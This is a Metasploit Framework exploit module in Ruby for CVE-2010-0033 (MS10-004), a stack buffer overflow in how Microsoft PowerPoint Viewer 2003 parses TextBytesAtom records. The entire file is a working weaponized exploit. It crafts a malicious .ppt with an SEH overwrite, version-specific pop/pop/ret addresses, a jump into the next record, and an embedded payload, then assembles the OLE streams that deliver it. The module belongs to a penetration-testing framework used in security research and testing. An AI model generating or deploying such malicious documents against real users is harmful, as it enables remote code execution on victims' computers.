##
# $Id: ms10_004_textbytesatom.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/ole'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft PowerPoint Viewer TextBytesAtom Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow vulnerability in the handling of
				the TextBytesAtom records by Microsoft PowerPoint Viewer. According to Microsoft,
				the PowerPoint Viewer distributed with Office 2003 SP3 and earlier, as well as
				Office 2004 for Mac, are vulnerable.

				NOTE: The vulnerable code path is not reachable on versions of Windows prior to
				Windows Vista.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'SkD',   # original discovery
					'Snake', # PoC
					'jduck'  # metasploit version
				],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2010-0033' ],
					[ 'OSVDB', '62241' ],
					[ 'MSB', 'MS10-004' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-017/' ],
					[ 'URL', 'http://www.snoop-security.com/blog/index.php/2010/03/exploiting-ms10-004-ppt-viewer/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'   => true # no need
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested with various patch levels of PowerPoint Viewer 2003 (v6.0.2600.0)
					[ 'Microsoft PowerPoint Viewer 2003',
						{
							'SEHOffset' => 132,
							'PopPopRet' => 0x30056471 # pop/pop/ret from PPTVIEW.exe v11.0.5703.0
						}
					],

					[ 'Microsoft PowerPoint Viewer 2003 (kb949041 or kb956500) or Office 2003 SP3',
						{
							'SEHOffset' => 132,
							'PopPopRet' => 0x3003c767 # pop/pop/ret from PPTVIEW.exe v11.0.8164.0
						}
					],

=begin
					#
					# This is commented out because of ASLR. gdiplus is no good.
					#
					[ 'Microsoft PowerPoint Viewer 2003 (kb956500 or kb969615)',
						{
							'SEHOffset' => 132,
							#'PopPopRet' => 0x39827475 # pop/pop/ret from gdiplus.dll v11.0.8230.0
							'PopPopRet' => 0x69647475
						}
					],
=end

					[ 'Microsoft PowerPoint Viewer 2003 (kb969615)',
						{
							'SEHOffset' => 132,
							'PopPopRet' => 0x300566d1 # pop/pop/ret from PPTVIEW.exe v11.0.8305.0
						}
					],

					#
					# All that is needed for new targets are the two vars! msfpescan will help.
					#

					# crash on a deref path to heaven.
					[ 'Crash Target for Debugging',
						{
							'SEHOffset' => 132,
							'PopPopRet' => 0xdac0ffee
						}
					]
				],
			'DisclosureDate' => 'Feb 09 2010'))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.ppt']),
			], self.class)
	end

	def ppt_record(tag, data=nil, ver=0, inst=0)
		data ||= ''
		ret = ''
		verinst = (ver & 0xf) | (inst << 4)
		ret << [verinst, tag, data.length].pack('vvV')
		ret << data
		ret
	end

	def exploit

		print_status("Creating PowerPoint Document ...")

		username = Rex::Text.rand_text_alphanumeric(8+rand(8))

		# smash the stack, hit SEH, use the pop-pop-ret to execute code on the stack
		sploit = rand_text(target['SEHOffset'])
		sploit << generate_seh_record(target['PopPopRet'])
		# jump ahead into the next atom
		distance = 10
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+" + distance.to_s).encode_string

		# TextBytesAtom
		text_bytes_atom = ppt_record(0xfa8, sploit)
		text_bytes_atom[4,4] = [0xffffffff].pack('V') # ..f8 thru ..ff
		#text_bytes_atom << ppt_record(0xfa8, "\xcc" + ("A" * 2046) + "\xcc")
		text_bytes_atom << ppt_record(0xfa8, ("A" * 16) + payload.encoded)


		# SlidePersistAtom
		spa1_data = [2,0,0,0x80000000,0].pack('VVVVV')
		spa1 = ppt_record(0x3f3, spa1_data)

		# SlideListWithText (first)
		slwt1 = ppt_record(0xff0, spa1, 15, 1)

		# SlidePersistAtom
		spa2_data = ''
		spa2_data << [3,0,2,0x100,0].pack('VVVVV')

		# SlideListWithText container (2nd)
		slwt2_data = ''
		slwt2_data << ppt_record(0x3f3, spa2_data)
		# TextHeaderAtom
		txt_hdr_data = [6].pack('V') # textType
		slwt2_data << ppt_record(0xf9f, txt_hdr_data)
		slwt2_data << text_bytes_atom
		slwt2 = ppt_record(0xff0, slwt2_data, 15)


		# Document container
		doc_data = ''
		doc_data << slwt1
		doc_data << slwt2
		doc = ppt_record(0x3e8, doc_data, 15)


		# MainMaster container
		mdc_data = ppt_record(0xf003, '', 15)
		ppd_data = ppt_record(0xf002, mdc_data, 15)

		# TextMasterStyleAtom
		tmsa_data = [0].pack('v') # cLevels (none)

		mm_data = ''
		mm_data << ppt_record(0xfa3, tmsa_data)
		mm_data << ppt_record(0x40c, ppd_data, 15)
		mm = ppt_record(0x3f8, mm_data, 15)


		# assembled stream contents
		content = ''

		document_offset = content.length
		content << doc

		main_master_offset = content.length
		content << mm

		# PersistPtrIncrementalBlock
		start_num = 1
		count = 2
		ppib_data = [(start_num & 0xfffff) | (count << 20)].pack('V')
		ppib_data << [document_offset].pack('V')
		ppib_data << [main_master_offset].pack('V')
		ppib = ppt_record(0x1772, ppib_data)

		# Store offset and add it
		persist_ptr_incremental_block_offset = content.length
		content << ppib

		# UserEditAtom
		uea_data = ''
		uea_data << [0x100].pack('V')         # lastSlideIdRef
		uea_data << [0x1599,0,3].pack('vCC')  # version, minorVer, majorVer
		uea_data << [0].pack('V')             # offsetLastEdit
		uea_data << [persist_ptr_incremental_block_offset].pack('V')
		uea_data << [1].pack('V')             # docPersistIdRef
		uea_data << [3].pack('V')             # persistIdSeed
		uea_data << [1].pack('v')             # lastView
		uea_data << [0x31c5].pack('v')        # unused??
		uea = ppt_record(0xff5, uea_data)

		# Store offset and add it
		user_edit_atom_offset = content.length
		content << uea


		# Create the output file
		out = File.expand_path(File.join(datastore['OUTPUTPATH'], datastore['FILENAME']))
		stg = Rex::OLE::Storage.new(out, Rex::OLE::STGM_WRITE)
		if (not stg)
			raise RuntimeError, 'Unable to create output file'
		end

		# PowerPoint Document stream
		stm = stg.create_stream("PowerPoint Document")
		if (not stm)
			raise RuntimeError, 'Unable to create "PowerPoint Document" stream'
		end
		stm << content
		stm.close


		# CurrentUserAtom stream
		cua_data = ''
		cua_data << [0x14].pack('V')        # size
		cua_data << [0xe391c05f].pack('V')  # headerToken (not encrypted)
		cua_data << [user_edit_atom_offset].pack('V')
		cua_data << [username.length].pack('v')
		cua_data << [0x3f4].pack('v')       # docFileVersion
		cua_data << [3,0].pack('CC')        # majorVer, minorVer
		cua_data << [0x3b].pack('v')        # unused??
		cua_data << username
		cua_data << [8].pack('V')           # relVersion (1 master slide)
		cua_data << Rex::Text.to_unicode(username)

		current_user_stream = ppt_record(0xff6, cua_data)

		stm = stg.create_stream("Current User")
		if (not stm)
			raise RuntimeError, 'Unable to create "Current User" stream'
		end
		stm << current_user_stream
		stm.close

		stg.close

		print_status("Generated output file #{out}")

	end

end
